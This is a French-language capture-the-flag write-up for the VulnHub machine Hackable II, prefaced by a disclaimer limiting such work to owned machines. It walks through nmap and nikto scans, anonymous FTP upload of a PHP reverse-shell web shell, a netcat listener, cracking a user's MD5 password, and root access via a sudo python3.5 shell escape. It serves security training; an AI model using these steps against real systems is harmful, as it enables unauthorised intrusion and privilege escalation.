{"hash":"250f333e9ef0347f8247956a19dfdff7c411a751","data":{"post":{"title":"CTF Hackable: 2","date":"23 June 2021","content":"<h2>Avant propos</h2>\n<p>Le déroulé de ce hack a été réalisé sur une machine prévue à cette effet. Il est interdit de mener ce genre d'action sur une machine qui ne vous appartient pas sans l'accord de son ou sa propriétaire.<br>\nCe CTF a été réalisé avec une machine attaquante <strong>Kali 2021.2</strong> (<code class=\"language-text\">lsb_release -r</code>).</p>\n<h2>Enumération</h2>\n<p>On récupère l'adresse IP de la machine distante avec <strong>Netdiscover</strong> <code class=\"language-text\">sudo netdiscover</code>.<br>\nAvant de poursuivre, on exporte cette adresse dans une variable pour être tranquille par la suite <code class=\"language-text\">export IP=192.168.1.32</code>.<br>\nPuis on créé un dossier dédié à ce CTF <code class=\"language-text\">cd Documents/ctf &amp;&amp; mkdir Hackable2 &amp;&amp; cd Hackable2</code>.<br>\nOn lance <strong>Nmap</strong> pour scanner les ports de la machine distante.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ nmap -A -p- <span class=\"token variable\">$IP</span> -oN nmap.txt\nPORT   STATE SERVICE VERSION\n<span class=\"token number\">21</span>/tcp <span class=\"token function\">open</span>  <span class=\"token function\">ftp</span>     ProFTPD\n<span class=\"token operator\">|</span> ftp-anon: Anonymous FTP login allowed <span class=\"token punctuation\">(</span>FTP code <span class=\"token number\">230</span><span class=\"token punctuation\">)</span>\n<span class=\"token operator\">|</span>_-rw-r--r--   <span class=\"token number\">1</span> <span class=\"token number\">0</span>        <span class=\"token number\">0</span>             <span class=\"token number\">109</span> Nov <span class=\"token number\">26</span>  <span class=\"token number\">2020</span> CALL.html\n<span class=\"token number\">22</span>/tcp <span class=\"token function\">open</span>  <span class=\"token function\">ssh</span>     OpenSSH <span class=\"token number\">7</span>.2p2 Ubuntu 4ubuntu2.10 <span class=\"token punctuation\">(</span>Ubuntu Linux<span class=\"token punctuation\">;</span> protocol <span class=\"token number\">2.0</span><span class=\"token punctuation\">)</span>\n<span class=\"token operator\">|</span> ssh-hostkey: \n<span class=\"token operator\">|</span>   <span class=\"token number\">2048</span> 2f:c6:2f:c4:6d:a6:f5:5b:c2:1b:f9:17:1f:9a:09:89 <span class=\"token punctuation\">(</span>RSA<span class=\"token punctuation\">)</span>\n<span class=\"token operator\">|</span>   <span class=\"token number\">256</span> 5e:91:1b:6b:f1:d8:81:de:8b:2c:f3:70:61:ea:6f:29 <span class=\"token punctuation\">(</span>ECDSA<span class=\"token punctuation\">)</span>\n<span class=\"token operator\">|</span>_  <span class=\"token number\">256</span> f1:98:21:91:c8:ee:4d:a2:83:14:64:96:37:5b:44:3d <span class=\"token punctuation\">(</span>ED25519<span class=\"token punctuation\">)</span>\n<span class=\"token number\">80</span>/tcp <span class=\"token function\">open</span>  http    Apache httpd <span class=\"token number\">2.4</span>.18 <span class=\"token variable\"><span class=\"token punctuation\">((</span>Ubuntu<span class=\"token punctuation\">))</span></span>\n<span class=\"token operator\">|</span>_http-server-header: Apache/2.4.18 <span class=\"token punctuation\">(</span>Ubuntu<span class=\"token punctuation\">)</span>\n<span class=\"token operator\">|</span>_http-title: Apache2 Ubuntu Default Page: It works\nService Info: OS: Linux<span class=\"token punctuation\">;</span> CPE: cpe:/o:linux:linux_kernel</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>On a un serveur <strong>FTP</strong> sur le port <strong>21</strong>, un serveur <strong>SSH</strong> sur le port <strong>22</strong> et un serveur <strong>Apache</strong> 2.4.18 sur le port <strong>80</strong>.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">ftp</span> <span class=\"token variable\">$IP</span>\nConnected to <span class=\"token number\">192.168</span>.1.32.\n<span class=\"token number\">220</span> ProFTPD Server <span class=\"token punctuation\">(</span>ProFTPD Default Installation<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span><span class=\"token number\">192.168</span>.1.32<span class=\"token punctuation\">]</span>\nName <span class=\"token punctuation\">(</span><span class=\"token number\">192.168</span>.1.32:kali<span class=\"token punctuation\">)</span>: anonymous\n<span class=\"token number\">331</span> Anonymous login ok, send your complete email address as your password\nPassword:\n<span class=\"token number\">230</span> Anonymous access granted, restrictions apply\nRemote system <span class=\"token builtin class-name\">type</span> is UNIX.\nUsing binary mode to transfer files.\nftp<span class=\"token operator\">></span> <span class=\"token function\">ls</span> -la\n<span class=\"token number\">200</span> PORT <span class=\"token builtin class-name\">command</span> successful\n<span class=\"token number\">150</span> Opening ASCII mode data connection <span class=\"token keyword\">for</span> <span class=\"token function\">file</span> list\ndrwxr-xrwx   <span class=\"token number\">2</span> <span class=\"token number\">33</span>       <span class=\"token number\">33</span>           <span class=\"token number\">4096</span> Nov <span class=\"token number\">26</span>  <span class=\"token number\">2020</span> <span class=\"token builtin class-name\">.</span>\ndrwxr-xrwx   <span class=\"token number\">2</span> <span class=\"token number\">33</span>       <span class=\"token number\">33</span>           <span class=\"token number\">4096</span> Nov <span class=\"token number\">26</span>  <span class=\"token number\">2020</span> <span class=\"token punctuation\">..</span>\n-rw-r--r--   <span class=\"token number\">1</span> <span class=\"token number\">0</span>        <span class=\"token number\">0</span>             <span class=\"token number\">109</span> Nov <span class=\"token number\">26</span>  <span class=\"token number\">2020</span> CALL.html\n<span class=\"token number\">226</span> Transfer complete\nftp<span class=\"token operator\">></span> get CALL.html\nlocal: CALL.html remote: CALL.html\n<span class=\"token number\">200</span> PORT <span class=\"token builtin class-name\">command</span> successful\n<span class=\"token number\">150</span> Opening BINARY mode data connection <span class=\"token keyword\">for</span> CALL.html <span class=\"token punctuation\">(</span><span class=\"token number\">109</span> bytes<span class=\"token punctuation\">)</span>\n<span class=\"token number\">226</span> Transfer complete</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>On récupère le fichier HTML.</p>\n<div class=\"gridsome-highlight\" data-language=\"html\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-html line-numbers\"><code class=\"language-html\">$ cat CALL.html                                      \n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">></span></span>onion<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h1</span><span class=\"token punctuation\">></span></span>GET READY TO RECEIVE A CALL<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h1</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Rien d'intéressant dans le fichier HTML si ce n'est le message \"GET READY TO RECEIVE A CALL\"... On teste la sécurité du serveur <strong>Apache</strong> avec <strong>Nikto</strong> dans un second onglet du terminal.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ nikto -h http://<span class=\"token variable\">$IP</span> -o nikto.txt\n+ Server: Apache/2.4.18 <span class=\"token punctuation\">(</span>Ubuntu<span class=\"token punctuation\">)</span>\n+ The anti-clickjacking X-Frame-Options header is not present.\n+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS\n+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site <span class=\"token keyword\">in</span> a different fashion to the MIME <span class=\"token builtin class-name\">type</span>\n+ No CGI Directories found <span class=\"token punctuation\">(</span>use <span class=\"token string\">'-C all'</span> to force check all possible <span class=\"token function\">dirs</span><span class=\"token punctuation\">)</span>\n+ Server may leak inodes via ETags, header found with <span class=\"token function\">file</span> /, inode: 2be7, size: 5b504999e72a0, mtime: <span class=\"token function\">gzip</span>\n+ Apache/2.4.18 appears to be outdated <span class=\"token punctuation\">(</span>current is at least Apache/2.4.37<span class=\"token punctuation\">)</span>. Apache <span class=\"token number\">2.2</span>.34 is the EOL <span class=\"token keyword\">for</span> the <span class=\"token number\">2</span>.x branch.\n+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS \n+ OSVDB-3268: /files/: Directory indexing found.\n+ OSVDB-3092: /files/: This might be interesting<span class=\"token punctuation\">..</span>.\n+ OSVDB-3233: /icons/README: Apache default <span class=\"token function\">file</span> found.</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Dans le répértoire \"files\", on retrouve le fichier HTML présent dans le serveur <strong>FTP</strong>.</p>\n<p>On prépare le webshell pour l'uploader sur le serveur <strong>FTP</strong>.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">cp</span> /usr/share/webshells/php/php-reverse-shell.php <span class=\"token builtin class-name\">.</span>\n$ <span class=\"token function\">vim</span> php-reverse-shell.php\n/<span class=\"token variable\">$ip</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span></span></pre></div>\n<p>Dans un troisième onglet, lancez le serveur <strong>Netcat</strong> avec la commande <code class=\"language-text\">nc -lnvp 1234</code>.</p>\n<p>On retourne sur le serveur FTP pour y glisser notre webshell.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">ftp<span class=\"token operator\">></span> put php-reverse-shell.php\nlocal: php-reverse-shell.php remote: php-reverse-shell.php\n<span class=\"token number\">200</span> PORT <span class=\"token builtin class-name\">command</span> successful\n<span class=\"token number\">150</span> Opening BINARY mode data connection <span class=\"token keyword\">for</span> php-reverse-shell.php\n<span class=\"token number\">226</span> Transfer complete\n<span class=\"token number\">5494</span> bytes sent <span class=\"token keyword\">in</span> <span class=\"token number\">0.00</span> secs <span class=\"token punctuation\">(</span><span class=\"token number\">68.0453</span> MB/s<span class=\"token punctuation\">)</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h2>Pénétration</h2>\n<p>Dans le second onglet, la connexion au serveur <strong>Netcat</strong> est établie.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ python3 -c <span class=\"token string\">'import pty; pty.spawn(\"/bin/sh\")'</span>\n$ <span class=\"token function\">id</span>\n<span class=\"token assign-left variable\">uid</span><span class=\"token operator\">=</span><span class=\"token number\">33</span><span class=\"token punctuation\">(</span>www-data<span class=\"token punctuation\">)</span> <span class=\"token assign-left variable\">gid</span><span class=\"token operator\">=</span><span class=\"token number\">33</span><span class=\"token punctuation\">(</span>www-data<span class=\"token punctuation\">)</span> <span class=\"token assign-left variable\">groups</span><span class=\"token operator\">=</span><span class=\"token number\">33</span><span class=\"token punctuation\">(</span>www-data<span class=\"token punctuation\">)</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span></span></pre></div>\n<p>Dans le fichier \".runme.sh\" présent à la racine du serveur, on trouve un nouvel utilisateur \"shrek\" et un mot de passe associé sous la forme d'une chaine de caractères en <strong>MD5</strong>.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">tail</span> /.runme.sh\nshrek:cf4c2232354952690368f1b3dfdfb24d</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>Après l'avoir décryptée sur le Web, on trouve le couple login et mot de passe \"shrek:onion\"</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">su</span> shrek\nPassword: onion</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>On est connecté avec ce nouvel utilisateur et on trouve le flag user dans le dossier de cet utilisateur <code class=\"language-text\">cat /home/shrek/user.txt</code>.</p>\n<h2>Escalation</h2>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">sudo</span> -l\nMatching Defaults entries <span class=\"token keyword\">for</span> shrek on ubuntu:\n    env_reset, mail_badpass,\n    <span class=\"token assign-left variable\">secure_path</span><span class=\"token operator\">=</span>/usr/local/sbin<span class=\"token punctuation\">\\</span>:/usr/local/bin<span class=\"token punctuation\">\\</span>:/usr/sbin<span class=\"token punctuation\">\\</span>:/usr/bin<span class=\"token punctuation\">\\</span>:/sbin<span class=\"token punctuation\">\\</span>:/bin<span class=\"token punctuation\">\\</span>:/snap/bin\n\nUser shrek may run the following commands on ubuntu:\n    <span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">)</span> NOPASSWD: /usr/bin/python3.5</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Cet utilisateur a des privilèges <code class=\"language-text\">sudo</code> avec la commande <code class=\"language-text\">python3.5</code>.</p>\n<p>Sur <a href=\"https://gtfobins.github.io/gtfobins/python/#sudo\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">GTFOBins</a>, on trouve facilement la commande pour être root de la machine avec <code class=\"language-text\">sudo</code>.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">sudo</span> python3.5 -c <span class=\"token string\">'import os; os.system(\"/bin/sh\")'</span>\n$ <span class=\"token function\">id</span>\n<span class=\"token assign-left variable\">uid</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">)</span> <span class=\"token assign-left variable\">gid</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">)</span> <span class=\"token assign-left variable\">groups</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">)</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span></span></pre></div>\n<p>On trouve le flag root dans le dossier <code class=\"language-text\">cat /root/root.txt</code>.</p>\n","download":"https://www.vulnhub.com/entry/hackable-ii,711","tags":[{"title":"Pentest","path":"/tag/Pentest/"},{"title":"CTF","path":"/tag/CTF/"},{"title":"webshell","path":"/tag/webshell/"}],"timeToRead":5,"parts":[]}},"context":{}}